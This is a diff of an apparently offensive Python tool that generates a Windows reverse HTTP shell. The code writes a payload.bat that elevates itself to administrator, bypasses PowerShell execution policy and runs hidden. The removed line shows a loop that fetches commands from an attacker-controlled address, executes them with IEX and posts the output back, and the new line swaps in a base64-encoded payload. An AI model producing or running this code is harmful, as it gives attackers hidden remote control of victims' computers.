@@ -10,7 +10,7 @@ e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
 print(f"{GREEN}PAYLOAD:{END}")
 print (f"powershell -e {e_payload}")
 
-print(f"{GREEN}TESTE- PAYLOAD .bat created {END}")
+print(f"{GREEN}PAYLOAD .bat created{END}")
 print("")
 f = open("payload.bat", "w")
 f.write("@echo off\n")
@@ -21,7 +21,7 @@ f.write(") else (\n")
 f.write(f"  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n")
 f.write(")\n")
 f.write(":start\n")
-f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}\"\n")
+f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -e {e_payload}")
 f.close()
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
